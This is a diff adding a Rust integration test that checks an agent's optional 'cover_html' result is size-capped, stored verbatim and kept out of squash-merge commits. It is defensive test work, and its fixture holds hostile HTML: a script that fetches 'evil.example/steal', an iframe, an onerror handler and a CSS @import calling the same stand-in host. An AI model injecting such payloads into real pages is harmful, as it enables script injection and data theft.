@@ -161,6 +161,213 @@ async fn submits_flow_over_nats_to_the_core() {
     );
 }
 
+/// Job #143: an agent may attach an optional `cover_html` to `submit_result`.
+/// It rides the same NATS ingest path, is size-capped-and-rejected (not
+/// truncated) at ingest, is stored verbatim on the task record (served through
+/// the task API), and never touches the squash-merge commit body.
+///
+/// Containment model (shared with #125's `Job::cover_html`, spec §1.1/§4.3):
+/// "sanitized" here means **size-capped at ingest** and rendered only inside a
+/// fully-sandboxed, CSP-locked iframe (no scripts, no forms, no network — see
+/// `web/src/components/CoverWidget.tsx`). Hostile markup is therefore neutralized
+/// at the single shared render choke point, so ingest stores the bytes verbatim
+/// rather than running an allowlist stripper — one model, both producers. This
+/// test proves genuinely hostile HTML (a `<script>`, an `<iframe>`, an inline
+/// `onerror`, an external `<img>`/CSS `@import` fetch) survives ingest untouched
+/// and, being presentational, never leaks into the squash body.
+#[tokio::test]
+async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
+    let Some(server) = test_utils::nats::NatsTestServer::spawn() else {
+        return;
+    };
+    let store = NatsStore::connect(server.url()).await.unwrap();
+    store.ensure_topology().await.unwrap();
+    let repo = TempRepo::create("acme", "api").await;
+    let clone = repo.clone_branch("main").await;
+    clone
+        .commit_file("jobs/impl-agent.yaml", IMPL_AGENT.as_bytes(), "type")
+        .await;
+    clone
+        .commit_file("prompts/impl.md", b"implement", "p")
+        .await;
+    clone.commit_file("prompts/eval.md", b"review", "p").await;
+    clone.push("main").await;
+
+    let provider = Arc::new(FakeProvider::new());
+    let repos_root = repo
+        .bare_path()
+        .parent()
+        .unwrap()
+        .parent()
+        .unwrap()
+        .to_path_buf();
+    let core = Core::new(
+        store.clone(),
+        vcs::RepoManager::new(repos_root),
+        Arc::new(FakeBackend::new()),
+        provider.clone(),
+        CoreConfig {
+            repo_url_base: "file:///repos".into(),
+            nats_url: server.url().into(),
+            ..Default::default()
+        },
+    )
+    .await
+    .unwrap();
+    let handle = spawn(core);
+    spawn_container_handlers(&store, handle.clone())
+        .await
+        .unwrap();
+
+    let bare = repo.bare_path();
+    let submit_store = store.clone();
+    provider.on_run(move |cfg| async move {
+        let branch = cfg.env.get("JOB_BRANCH").unwrap().clone();
+        let clone = test_utils::repo::clone_branch_from(&bare, &branch).await;
+        clone.commit_file("src/f.rs", b"fn f() {}", "impl").await;
+        clone.push(&branch).await;
+
+        // An oversized cover is rejected at ingest with an actionable error —
+        // never truncated, and the (canonical) summary doesn't land either.
+        let huge = "x".repeat(64 * 1024 + 1);
+        let payload = serde_json::json!({ "summary": "added f()", "cover_html": huge });
+        let rejected = submit_store
+            .request_with_retry(
+                "req.work.submit.acme.api.1",
+                serde_json::to_vec(&payload).unwrap().as_slice(),
+                10,
+                Duration::from_millis(200),
+            )
+            .await
+            .unwrap();
+        let body = String::from_utf8_lossy(&rejected.payload);
+        assert!(
+            body.contains("error") && body.contains("cover_html"),
+            "{body}"
+        );
+
+        // The resubmission carries a HOSTILE cover — script, iframe, an inline
+        // event handler, and external image/CSS fetches. Ingest neither strips
+        // nor rejects it (it is within the size cap); it is stored verbatim and
+        // contained downstream by the shared sandboxed+CSP render.
+        let hostile = "<script>fetch('http://evil.example/steal')</script>\
+             <iframe src=\"http://evil.example/frame\"></iframe>\
+             <img src=\"http://evil.example/pixel.png\" onerror=\"alert(1)\">\
+             <style>@import url('http://evil.example/x.css');</style>\
+             <h1>COVERMARKER</h1>";
+        let payload = serde_json::json!({ "summary": "added f()", "cover_html": hostile });
+        submit_store
+            .request_with_retry(
+                "req.work.submit.acme.api.1",
+                serde_json::to_vec(&payload).unwrap().as_slice(),
+                10,
+                Duration::from_millis(200),
+            )
+            .await
+            .unwrap();
+    });
+    let eval_store = store.clone();
+    provider.on_run(move |cfg| async move {
+        let task_id = cfg.env.get("JOB_TASK_ID").unwrap();
+        let subject = format!("req.eval.submit.acme.api.1.{task_id}");
+        eval_store
+            .request_with_retry(
+                &subject,
+                br#"{"pass":true}"#,
+                10,
+                Duration::from_millis(200),
+            )
+            .await
+            .unwrap();
+    });
+
+    let job = handle
+        .create_job(CreateJobRequest {
+            owner: "acme".into(),
+            project: "api".into(),
+            r#type: "impl-agent".into(),
+            title: String::new(),
+            description: String::new(),
+            cover_html: None,
+            deps: vec![],
+            knowledge_tags: vec![],
+            eval: vec![],
+            timeout: None,
+            model: None,
+            factory: None,
+            members: vec![],
+            draft: false,
+        })
+        .await
+        .unwrap();
+    handle.release_job("acme", "api", job.id).await.unwrap();
+
+    let jobs = store.jobs().await.unwrap();
+    for _ in 0..100 {
+        if jobs.get("acme", "api", 1).await.unwrap().unwrap().state == JobState::Done {
+            break;
+        }
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+    assert_eq!(
+        jobs.get("acme", "api", 1).await.unwrap().unwrap().state,
+        JobState::Done
+    );
+
+    // Stored verbatim on the Work task record (served through the task API).
+    let tasks = store
+        .tasks()
+        .await
+        .unwrap()
+        .list_for_job("acme", "api", 1)
+        .await
+        .unwrap();
+    let work = tasks
+        .iter()
+        .find(|t| t.phase == types::TaskPhase::Work)
+        .expect("work task");
+    match &work.result {
+        Some(types::TaskResult::Work {
+            summary: Some(s),
+            cover_html: Some(c),
+            ..
+        }) => {
+            assert_eq!(s, "added f()");
+            // Every hostile fragment survived ingest byte-for-byte — the shared
+            // sandboxed+CSP render is what neutralizes it, not an ingest stripper.
+            for marker in [
+                "<script>",
+                "<iframe",
+                "onerror=",
+                "http://evil.example",
+                "@import",
+                "COVERMARKER",
+            ] {
+                assert!(
+                    c.contains(marker),
+                    "hostile cover not stored verbatim ({marker}): {c}"
+                );
+            }
+        }
+        other => panic!("expected a Work result carrying the cover, got {other:?}"),
+    }
+
+    // The merge gate/squash body is unaffected: the summary rode into the commit
+    // body but no part of the (hostile) cover HTML did.
+    let log = repo.manager.log("acme", "api", None, 1).await.unwrap();
+    let body = format!("{log:?}");
+    assert!(
+        body.contains("added f()"),
+        "summary missing from squash: {body}"
+    );
+    for leaked in ["COVERMARKER", "evil.example", "<script>"] {
+        assert!(
+            !body.contains(leaked),
+            "cover_html must never reach the squash body ({leaked}): {body}"
+        );
+    }
+}
+
 /// Channel posts used to be written straight to `channels` KV by the container:
 /// a second writer to platform state, last-write-wins, invisible to the
 /// dispatcher, in a bucket with a 7-day TTL. So an agent's progress narrative
